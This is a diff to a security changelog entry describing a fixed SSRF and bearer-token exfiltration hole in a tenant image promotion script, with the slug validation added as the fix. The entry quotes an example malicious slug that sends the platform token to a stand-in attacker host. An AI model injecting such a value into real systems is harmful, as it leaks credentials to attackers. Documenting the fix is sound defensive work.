@@ -36,7 +36,7 @@ No customer-visible changes. All activity was internal infrastructure and SOP to
 
 ### 🔒 Security
 
-- **OFFSEC-006: tenant slug SSRF + token exfiltration in `promote-tenant-image.sh` fixed**: tenant slugs were interpolated into URL paths without sanitisation. A malicious slug such as `?url=https://attacker.com&token=$CP_TOKEN` could trigger SSRF or exfiltrate the platform bearer token. The fix adds RFC-1123 slug validation (`validate_slug()`) that rejects any slug not matching `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$` before any network call, and disables glob expansion of metacharacters with `set -f`. (`molecule-core` [#933](https://git.moleculesai.app/molecule-ai/molecule-core/pulls/933))
+- **OFFSEC-006: tenant slug SSRF + token exfiltration in `promote-tenant-image.sh` fixed**: tenant slugs were interpolated into URL paths without sanitisation. A malicious slug such as `?url=https://attacker.com&token=$CP_TOKEN` could trigger SSRF or exfiltrate the platform bearer token. The fix adds RFC-1123 slug validation (`validate_slug()`) that rejects any slug not matching `^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$` before any network call. (`molecule-core` [#933](https://git.moleculesai.app/molecule-ai/molecule-core/pulls/933))
 
 ### 🔧 Fixes
 
